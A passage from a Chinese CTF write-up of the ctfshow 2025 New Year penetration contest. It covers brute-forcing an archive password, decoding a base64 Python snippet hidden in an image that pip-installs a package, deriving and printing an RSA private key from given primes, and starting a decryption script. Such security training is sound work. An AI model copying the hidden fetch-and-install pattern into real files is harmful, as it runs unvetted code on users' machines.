        <content type="html"><![CDATA[<h3 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h3><h4 id="启程"><a href="#启程" class="headerlink" title="启程"></a>启程</h4><p>任务应援包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">633246888504573920779824237508007735589231666589188021171575950939940255140086052090801972411182075806200277922264916256376952068104942084262732765302869757002336862151158422906662985191392193462511289187123754337854684702016396996198789908170728175626225281406256476216079863574750768787169969475152717430903460149705597463505143799487488630064694962535355825378265518133414832135165998125004282912865895836379205933895029154287788824317000843771251331435939410389957572552746410933103347212260533351406876584798128116835102705770834548333327952204414218313396767348386545933700371706780732081128764732828398879654027694999061445888984652196057717761623666471390226500419047354546009526849190038055817008252022472857695300387827500818231719929626707573775972451255428059119840669826086027702546510213791864358183204530776020004866770536545695330324167569777791175170044812028227494966458864002660598592490354017639158027968836329598282419666463285900175674408026881052737148611395153194390130628356104784358804158581294733196703476913434055209441802708485723455322985654447400945734717510509951259155462497189459983874690099575241597111904193711108488616566486665053884629084564364205319797812148684173057523812840684555544241901417</span><br><span class="line">31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681</span><br><span class="line">19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657</span><br></pre></td></tr></table></figure><p>给了一张图片，但需要密码</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-190341.png"></p><p><strong>ARCHPR</strong>爆破：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-190643.png"></p><p><code>FLAG1：ctfshow&#123;654321&#125;</code></p><h4 id="破解加密通讯"><a href="#破解加密通讯" class="headerlink" title="破解加密通讯"></a>破解加密通讯</h4><p>要求我们找到<strong>任务中心的地址</strong></p><p>用winhex打开我们的图片：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-191053.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHRyeToKICAgICAgICBpbXBvcnQgc2VjcmV0TWVzc2FnZVJlc3BvbnNlCiAgICBleGNlcHQgSW1wb3J0RXJyb3I6CiAgICAgICAgaW1wb3J0IHBpcAogICAgICAgIHBpcC5tYWluKFsnaW5zdGFsbCcsICdzZWNyZXRNZXNzYWdlUmVzcG9uc2UnXSkKICAgICAgICBmcm9tIHNlY3JldE1lc3NhZ2VSZXNwb25zZSBpbXBvcnQgcHJpbnRNZXNzYWdl</span><br></pre></td></tr></table></figure><p>base64解码：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-191145.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> secretMessageResponse</span><br><span class="line">    <span class="keyword">except</span> ImportError:</span><br><span class="line">        <span class="keyword">import</span> pip</span><br><span class="line">        pip.main([<span class="string">&#x27;install&#x27;</span>, <span class="string">&#x27;secretMessageResponse&#x27;</span>])</span><br><span class="line">        <span class="keyword">from</span> secretMessageResponse <span class="keyword">import</span> printMessage</span><br></pre></td></tr></table></figure><p>这段代码的主要功能是：</p><ul><li>检查 <code>secretMessageResponse</code> 模块是否存在。</li><li>如果不存在，则使用 <code>pip</code> 安装该模块。</li><li>然后从 <code>secretMessageResponse</code> 模块中导入 <code>printMessage</code>。</li></ul><p>kali上运行：</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250226-192215.png"></p><p><strong>应援包给的RSA的n、p、q，可以求出d</strong>，求<strong>私钥</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">p=<span class="number">31764044218067306492147889531461768510318119973238219147743625781223517377940974553025619071173628007991575510570365772185728567874710285810316184852553098753128108078975486635418847058797903708712720921754985829347790065080083720032152368134209675749929875336343905922553986957365581428234650288535216460326756576870072581658391409039992017661511831846885941769553385318452234212849064725733948770687309835172939447056526911787218396603271670163178681907015237200091850112165224511738788059683289680749377500422958532725487208309848648092125981780476161201616645007489243158529515899301932222796981293281482590413681</span></span><br><span class="line">q=<span class="number">19935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657</span></span><br><span class="line">n=<span class="number">633246888504573920779824237508007735589231666589188021171575950939940255140086052090801972411182075806200277922264916256376952068104942084262732765302869757002336862151158422906662985191392193462511289187123754337854684702016396996198789908170728175626225281406256476216079863574750768787169969475152717430903460149705597463505143799487488630064694962535355825378265518133414832135165998125004282912865895836379205933895029154287788824317000843771251331435939410389957572552746410933103347212260533351406876584798128116835102705770834548333327952204414218313396767348386545933700371706780732081128764732828398879654027694999061445888984652196057717761623666471390226500419047354546009526849190038055817008252022472857695300387827500818231719929626707573775972451255428059119840669826086027702546510213791864358183204530776020004866770536545695330324167569777791175170044812028227494966458864002660598592490354017639158027968836329598282419666463285900175674408026881052737148611395153194390130628356104784358804158581294733196703476913434055209441802708485723455322985654447400945734717510509951259155462497189459983874690099575241597111904193711108488616566486665053884629084564364205319797812148684173057523812840684555544241901417</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#计算其他相关参数</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=<span class="built_in">pow</span>(e,-<span class="number">1</span>,phi)</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成私钥</span></span><br><span class="line">key=RSA.construct((n,e,d,p,q))</span><br><span class="line"><span class="comment">#export_key() 将私钥导出为PEM格式字符串，便于存储或传输。</span></span><br><span class="line">private_key=key.export_key()</span><br><span class="line"><span class="built_in">print</span>(private_key.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIJKQIBAAKCAgEAmziayo9Tddo1FYdrtOswyjLYJ5frYKEwm4rQTsKU8UcdnnDR</span><br><span class="line">gms+ZmStoqlH/qi6x+D1K3fvvioCnGZLFHZwBUqbgT5x+qUmUaVMll9FOT7ZJ05w</span><br><span class="line">8n8Ljqa1akzFMU5G7YbCr3vQwN63vwvD9/63TDbXkJrv1fGl2rHpPwp5OPCUeCB3</span><br><span class="line">nIFIRCWHpJU7sHJqIP5vzV8KNJtbxgR+dhszdg+NhoBDUpxoVN5lzSKr2TMOLFLZ</span><br><span class="line">aQR9AWOV/aHV8gjTkTLDZfc+XlfhxiDMTQdiUTbk/tynpt+JFrDA8vL5/TOmuxgu</span><br><span class="line">mqgXZIPGrIUbwloTYyHD/XXmvXu5KE8g3eMKgxNxuEKM5bMTESBK9A7Q2Kj3eNp0</span><br><span class="line">Rvb5Aleg7h8/YbQemGelY/o5xpUyHgHjsfNQ3j/xhdhVCNVaXZF64V/YVpvC9Cq2</span><br><span class="line">9F7qI+bl6FlN7zSpuHB3QgNS1uXOmjBCsA7ypZoWmdXeaLIO+I3kP48BBSmue4ni</span><br><span class="line">dJifiK/kSOcZ0iegRXV1hyZ6pYdDE7hM5V5t5tvayJ31zRQNT2ALAFeCDozVWELH</span><br><span class="line">TnphkPkQO+SOPglrVz0S1dXicqRofXWMj7PJOFkBpWIX0aywMIh1woEAawUs3RM2</span><br><span class="line">pfLUNtqUTfodSCmWlwcpGrBWG5NACx7csPFtzWn8oPZfzL346at5DDIwD2kCAwEA</span><br><span class="line">AQKCAgA+oGYD2DQqVrIYT50rT8FNs5n2z5rOT/rWpvlI7cU+XB0dMhO19SMmGPTd</span><br><span class="line">rkM4AkfqIV+J/Egkh7qp87PTO74SxHldeh5urHd7daAjA6lgYXUoIMP9czjsg2Kq</span><br><span class="line">0vK05ApGB5tBRkmBp9qnIE4fHwxBmdb7pyehQHBUfnfHUah7SsX8ec0Ivji0FhhW</span><br><span class="line">VUfR9zfOvBnL2M67TvuGN4X2jR8EQV4uqE2BZU3LADg+vgBsD+dmBr9lWcQ97To1</span><br><span class="line">LTivANSrvrmLyGfHlNmpIM6NPa9zaRyXn9ucvpAHMaWH4HTwrghVcHpNOAjIK0rb</span><br><span class="line">jJEYp1MvKg5zk0BXrzWTh+mQ3Ov+NXrbdDspmeZsY02SuyPheOBHHHs7cHANPcRH</span><br><span class="line">1Nl/nxXkRF9H+oSOmTQi7wjZbhrEFFCeCK2TuT8vyf0p+lQMPEc+cAFn5rSXnhii</span><br><span class="line">W2Mq6nwx5Nbllr/hj7oVeyGrUZFskvbZnYYVM4NTFqUPBzQbBuQTGGfccZc9OrJx</span><br><span class="line">2qpDZdUknQe9ZI742c2vZRTqY2yZX6InR8JoQbmscke4LRdUMHH6G/PbfkqPXfFy</span><br><span class="line">r5mxscghP+kRFj86dyL03CB039N23xCNezK/AGE/6JzJgwpvUPaYtvnIuhSFQEmH</span><br><span class="line">DGrYYrDXSbwTT0ufM/tIEuHMHXT4DYX3nm94SG8wB/b3zpFdAQKCAQEA+56kjWCg</span><br><span class="line">Wcjo+QUgp50+BIa5hkFoV16QOCQEsqh+s5rhVMke7svuo5+U6C/rNFIkpR1iKRPL</span><br><span class="line">3LOqJ8B5P7ZAPdhbHAPjdtnUDbPzM1r0RYpjbJPh4AcRVqhDTWy20Yd7iZN9mHxH</span><br><span class="line">SKBZ4Txn20gvkHamPVlPMejsDRpDoauS/euzn2GlG9GPq7i5vHwQiy6sYZAPm9Ey</span><br><span class="line">z+XxsQNiqB32tHnZqYrj/GS64Jx6eaa5MdSCLIPkHHWAUHzBQ5A8/bNTFf8VAYri</span><br><span class="line">R9GnTZF8oSNne6oD62IYVzDH2wWOWSnUKdAdsnaahJLvHQnWbz6itWPWj+2TrjLS</span><br><span class="line">nl9Tz7uuhrRjcQKCAQEAnexbL5Sov7N4W7BrZZao8cKEnM6goDpUjqgEnlIG4FF+</span><br><span class="line">UVmBzuAYNlLjOXW7fKK6nt5q95R1AA72FpfOHbZnTTYHm9u1zUecIeuvNVjxi9sw</span><br><span class="line">hmhMn43pxaQcUfgWSsCrqH+8SrVEz8Lc7V2lbswx/V94PC8Za7ZLSr+FOz6X7C71</span><br><span class="line">sLQR8XI3SkrZIkmL150N8LO4WdKAtKKIfvz7Lo2xLxpGLNJ3Xf/NW51wMs5BwQNz</span><br><span class="line">EUWRUmkgCmeU74m47TCSOj580qLLT0Hxj1jRhecZOs0DHqDCeHt0hz82EtOcw1TB</span><br><span class="line">JKTly3Xj/UjGRpzEmo8rAuU8XoKc/NkmaZCjpxh/eQKCAQEArbI5E+OFLhXURbs1</span><br><span class="line">bJ/OpR8/yR8z4URFOIwcthw8ws2DCZ2A/gXHaiqKh7I0oryl0Vm0Xnjs/SEFsEVd</span><br><span class="line">Lg8oz8igNHm2t1/t07vKgkQiZjL/KX/4qEcYwAKN20/V8FSfgjxPskjwiIExKpwh</span><br><span class="line">ca2mMArH/Ye+dMy+zti3oU4ovaLNL5Qff1Gt5TQy+5uFbB8/HmZtb/n9IqkwrCqT</span><br><span class="line">G0z79mA7Up+vfJcork82+O2P4Ic7iXFOshqnBmjonTRf9h6pl4CsRpFSXZOr848g</span><br><span class="line">QriHAkY+SGpCNUZWYKq4NnL6pBanuX/IcQZhjGEzJz5M4fzWrCqsDM/Gt09FMxzz</span><br><span class="line">gMfb8QKCAQEAhnF+W65yTulKELzLYWv2ngLchOY/xsiBzgTqEaKBahzWrgjGQsly</span><br><span class="line">s2SzPuqk14Ft4Ow3IljHlmomRKut9IuhvBDAP4a3anCJUjNkMMVstYS/9dz7RmY5</span><br><span class="line">W2HQHlRXHgKS4NsGAI/7aehZztYHjaDW+f55zLrIKHPD+3m6weoSyiZcUberAuMa</span><br><span class="line">gOvhmJgGLmPtRzqpOgbEPYOVMo7KhCJqclAq5+OxbVvlhxYsO4RuZBQ8tLqF8iO+</span><br><span class="line">/DychaS4w2yzQFSMTYH8FZhtPnz9usI4L1/zRPLVPF7VoIJG1ZZDgeM4nqqnWyQd</span><br><span class="line">GTcIXXr+wRobItbnIwqM/ZEca4iQWiO3+QKCAQAjp153c8JvZhR3Stan0bKYHzMm</span><br><span class="line">FWEUjmygq6xgzclvkWWYmHwHvYjO4tITXHSmEt5GrUY/W1LOA0x9HRMUh7p71tw6</span><br><span class="line">7ni/lELMlT6Sk3b32SRoftEr5SmNEZlXPh2UYC260FkXNj3hhShv7DAZyV2bthqk</span><br><span class="line">YV63M7neAAU5YPmq0uvMvxHv1D17bswwbiJ3mzb/E4CSR2gDkKrZGshtJbKUtLvb</span><br><span class="line">wEigkCIjw+UFRhLiK4R+OIL7bZtE2unbYWeL1h4w1BLwFJPg/26Gnq91V96GwoKf</span><br><span class="line">JiAEy9wfJBnCwJPdr9OV9GGrMfBRF8Rkl6YyvNNb21C6ZABBuAzWpfu0I60h</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p><strong>用私钥解密，解密脚本</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes</span><br><span class="line"></span><br><span class="line">message=&#123;</span><br><span class="line">    <span class="string">&quot;inputMessage_20241216&quot;</span>:<span class="string">&#x27;&#x27;&#x27;gHgAsclUVPhWDv4S8Oa8SuRTDaj+V0dI4z2jrQwfvfSFWilWwMKwNULUI48UBLS2shZcm/yv2/e5Hq5VRDfXkdxCYQMdvdnvONtpm2yNiIaLpDV4Rs8fOXJ6kcaeT+mg4RkIIFgx35w4J1KgO72pSP8j1p+R9f9TNMafwJ91XmO4QTcOYkMKQMddKvhbyMXzJkSS0uZqEppNSIUnVX9b7m8PmMjV0uHShvb1Zc8UQWJWUJ3cOxwNasOeMQGxJrZXPkxIxDYzm3f0tXbCgvdgNZ8TQY7u+iCXjOtD6xnUsdSahnPq14BD30CilIfsG0r/klPHfxQ+psmHSX47Ylai0TtgfbHWJJ4lSo0ojMvTx6HYK8zmAoCmg4OGXDbv/IjJgYU1w24na0iXZCNtcjB9MLRNck00c20f/uS64Ss0Ixii8nmfsFOjQBCcIYN+HGmOnj5Uw8DVJrxlOmcfQciG3rzuIvYlbOdGMcyarTy2Ba7iZfoovYZObPscAwhNLWqbU4tuR78aOVxiXTFRY7+Y0x2eRT5sulcvB3vsKuDMlNrxaUgiFUohPBZGNsgQgyCPxxqk0NpUn0bbHLH+vBebjJxaim4AU28ctWW8xv7xpxVttb0EoohtK2cIHr79ep5XrU/rv4R58obD/o+QqI1Mrb4wwpX9tsL7ZbROw/MXJwM=&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;inputMessage_20240411&quot;</span>:<span class="string">&#x27;&#x27;&#x27;Z93Khatj+AWZcpPwIqu8LzbJ8xb8CuVMI8okE0qwoQD2IC2lixg77mJZireOrbW7zFkDsk1hP67dROJZwVUDrYot2g5GxX/xy7lGjIblUX4iJVUtP4mHqZUgKROaLoh/gippMpP+8Ik2X/QRBx5gdhq0xam+wuVC+77/tyu8Fd/DohKbAMp8aaJsFr/W4mLDZ1gv4JK+2O3l+bAvpodBRTzb0ld5zD2ueYvjTudoDjdanQP1oVTH7pkDO2Vb+SsdIyTi2C410JEOF4Qm8mzVHtiOunOcLVpAlQsM6/LdhqsTNelXl/Myb84NGxwGWVmx6j2QejiL7S1hHeHlmQ9ExHeURPdZAvKhgMCemYXu3BGlFq3ydb5SkqwLFvM4vJ6XUBcWkHT8eijBFF6Y7YgOv9GRvBTnsAQhUBp4W4EAMtXkDdToG+S8ZO7El8Gh8jaWC49n5CuUBRz3z2GeOVbsBamfLV06IO5v78jGHXig4saEFKHvYSIGewyUCVQEGoIR5xOTJBTUTePAdvQjfg28vZZxFB/hIYNDUHkaek1Mg1UH5HWGgsCX1In5hSX/9eBkznEhzeWnJ1yMsYkj+ddN34DLQSrHc83geXMcoW3Ah3cAQG8E8bszvKL3hme+T5rOeENjkOAgYhf84k4YlxDskdwvzyu8HkE9CSaBpDP6lKI=&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;inputMessage_20240305&quot;</span>:<span class="string">&#x27;&#x27;&#x27;ckDSthpl5DDJMpBE26Jqk8EjaSq7MUntdwLHPouwx6D38un6WQfLJ9wgDyjh9GA/ICJR7WrwWsVinr6y3u9w+ubMZ0mqmtnphzQraagk8NkKc1u1+qGp8llsud3C8mvJWa4GYa9KEhnACDHwppPKJDCfr1HKwPbR0NIi+1Aunmy6DeOKRkFwysnrSco5QiiC9+gdXFhQDmN9KEiYW6Pc3mWVbqFiJgRW3/Df6638oGPm6AUcgRnEWMKiluyN81frM9VNtCeJ64YrU6Rgx4D153YxNNQbLTcyCQMamHTrJnhxPojkuDqbEcU+iiN4offwrQyr4eEu9ecvmyD2w/n7pAOsVnqSzroBujVA+CK6Zq8Uie15mL5yWG9hD5ZcbSwnRmtqK3yl0Xl91hgn1JqcIEKtf+MnMQPr80uoxT3mz8IX8pyVnyyw1x6F+IK1I2G+5w6rUDjhzIbME5XB9hopwcswsXrMo9PP6/5Sz1noJrsu6k6WN8ZM0MyRIav+xuKP1+cYzlPSQZrMo3L4ieHQnBbsoyzGVf9QONMwaooGOrxu88ZWlGe8e7eyCzteeNSVOC2zqtQiwQJIgfp2UwTymA/cEjOICWVzUXwbE5wWUBPCLp2C/XWc82byrOHAFXHLOVKgolVToUpZ5uOvizgk/ahaxdGxGa9CrRyr6sf+goA=&#x27;&#x27;&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backend=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIIJKQIBAAKCAgEAmziayo9Tddo1FYdrtOswyjLYJ5frYKEwm4rQTsKU8UcdnnDR</span></span><br><span class="line"><span class="string">gms+ZmStoqlH/qi6x+D1K3fvvioCnGZLFHZwBUqbgT5x+qUmUaVMll9FOT7ZJ05w</span></span><br><span class="line"><span class="string">8n8Ljqa1akzFMU5G7YbCr3vQwN63vwvD9/63TDbXkJrv1fGl2rHpPwp5OPCUeCB3</span></span><br><span class="line"><span class="string">nIFIRCWHpJU7sHJqIP5vzV8KNJtbxgR+dhszdg+NhoBDUpxoVN5lzSKr2TMOLFLZ</span></span><br><span class="line"><span class="string">aQR9AWOV/aHV8gjTkTLDZfc+XlfhxiDMTQdiUTbk/tynpt+JFrDA8vL5/TOmuxgu</span></span><br><span class="line"><span class="string">mqgXZIPGrIUbwloTYyHD/XXmvXu5KE8g3eMKgxNxuEKM5bMTESBK9A7Q2Kj3eNp0</span></span><br><span class="line"><span class="string">Rvb5Aleg7h8/YbQemGelY/o5xpUyHgHjsfNQ3j/xhdhVCNVaXZF64V/YVpvC9Cq2</span></span><br><span class="line"><span class="string">9F7qI+bl6FlN7zSpuHB3QgNS1uXOmjBCsA7ypZoWmdXeaLIO+I3kP48BBSmue4ni</span></span><br><span class="line"><span class="string">dJifiK/kSOcZ0iegRXV1hyZ6pYdDE7hM5V5t5tvayJ31zRQNT2ALAFeCDozVWELH</span></span><br><span class="line"><span class="string">TnphkPkQO+SOPglrVz0S1dXicqRofXWMj7PJOFkBpWIX0aywMIh1woEAawUs3RM2</span></span><br><span class="line"><span class="string">pfLUNtqUTfodSCmWlwcpGrBWG5NACx7csPFtzWn8oPZfzL346at5DDIwD2kCAwEA</span></span><br><span class="line"><span class="string">AQKCAgA+oGYD2DQqVrIYT50rT8FNs5n2z5rOT/rWpvlI7cU+XB0dMhO19SMmGPTd</span></span><br><span class="line"><span class="string">rkM4AkfqIV+J/Egkh7qp87PTO74SxHldeh5urHd7daAjA6lgYXUoIMP9czjsg2Kq</span></span><br><span class="line"><span class="string">0vK05ApGB5tBRkmBp9qnIE4fHwxBmdb7pyehQHBUfnfHUah7SsX8ec0Ivji0FhhW</span></span><br><span class="line"><span class="string">VUfR9zfOvBnL2M67TvuGN4X2jR8EQV4uqE2BZU3LADg+vgBsD+dmBr9lWcQ97To1</span></span><br><span class="line"><span class="string">LTivANSrvrmLyGfHlNmpIM6NPa9zaRyXn9ucvpAHMaWH4HTwrghVcHpNOAjIK0rb</span></span><br><span class="line"><span class="string">jJEYp1MvKg5zk0BXrzWTh+mQ3Ov+NXrbdDspmeZsY02SuyPheOBHHHs7cHANPcRH</span></span><br><span class="line"><span class="string">1Nl/nxXkRF9H+oSOmTQi7wjZbhrEFFCeCK2TuT8vyf0p+lQMPEc+cAFn5rSXnhii</span></span><br><span class="line"><span class="string">W2Mq6nwx5Nbllr/hj7oVeyGrUZFskvbZnYYVM4NTFqUPBzQbBuQTGGfccZc9OrJx</span></span><br><span class="line"><span class="string">2qpDZdUknQe9ZI742c2vZRTqY2yZX6InR8JoQbmscke4LRdUMHH6G/PbfkqPXfFy</span></span><br><span class="line"><span class="string">r5mxscghP+kRFj86dyL03CB039N23xCNezK/AGE/6JzJgwpvUPaYtvnIuhSFQEmH</span></span><br><span class="line"><span class="string">DGrYYrDXSbwTT0ufM/tIEuHMHXT4DYX3nm94SG8wB/b3zpFdAQKCAQEA+56kjWCg</span></span><br><span class="line"><span class="string">Wcjo+QUgp50+BIa5hkFoV16QOCQEsqh+s5rhVMke7svuo5+U6C/rNFIkpR1iKRPL</span></span><br><span class="line"><span class="string">3LOqJ8B5P7ZAPdhbHAPjdtnUDbPzM1r0RYpjbJPh4AcRVqhDTWy20Yd7iZN9mHxH</span></span><br><span class="line"><span class="string">SKBZ4Txn20gvkHamPVlPMejsDRpDoauS/euzn2GlG9GPq7i5vHwQiy6sYZAPm9Ey</span></span><br><span class="line"><span class="string">z+XxsQNiqB32tHnZqYrj/GS64Jx6eaa5MdSCLIPkHHWAUHzBQ5A8/bNTFf8VAYri</span></span><br><span class="line"><span class="string">R9GnTZF8oSNne6oD62IYVzDH2wWOWSnUKdAdsnaahJLvHQnWbz6itWPWj+2TrjLS</span></span><br><span class="line"><span class="string">nl9Tz7uuhrRjcQKCAQEAnexbL5Sov7N4W7BrZZao8cKEnM6goDpUjqgEnlIG4FF+</span></span><br><span class="line"><span class="string">UVmBzuAYNlLjOXW7fKK6nt5q95R1AA72FpfOHbZnTTYHm9u1zUecIeuvNVjxi9sw</span></span><br><span class="line"><span class="string">hmhMn43pxaQcUfgWSsCrqH+8SrVEz8Lc7V2lbswx/V94PC8Za7ZLSr+FOz6X7C71</span></span><br><span class="line"><span class="string">sLQR8XI3SkrZIkmL150N8LO4WdKAtKKIfvz7Lo2xLxpGLNJ3Xf/NW51wMs5BwQNz</span></span><br><span class="line"><span class="string">EUWRUmkgCmeU74m47TCSOj580qLLT0Hxj1jRhecZOs0DHqDCeHt0hz82EtOcw1TB</span></span><br><span class="line"><span class="string">JKTly3Xj/UjGRpzEmo8rAuU8XoKc/NkmaZCjpxh/eQKCAQEArbI5E+OFLhXURbs1</span></span><br><span class="line"><span class="string">bJ/OpR8/yR8z4URFOIwcthw8ws2DCZ2A/gXHaiqKh7I0oryl0Vm0Xnjs/SEFsEVd</span></span><br><span class="line"><span class="string">Lg8oz8igNHm2t1/t07vKgkQiZjL/KX/4qEcYwAKN20/V8FSfgjxPskjwiIExKpwh</span></span><br><span class="line"><span class="string">ca2mMArH/Ye+dMy+zti3oU4ovaLNL5Qff1Gt5TQy+5uFbB8/HmZtb/n9IqkwrCqT</span></span><br><span class="line"><span class="string">G0z79mA7Up+vfJcork82+O2P4Ic7iXFOshqnBmjonTRf9h6pl4CsRpFSXZOr848g</span></span><br><span class="line"><span 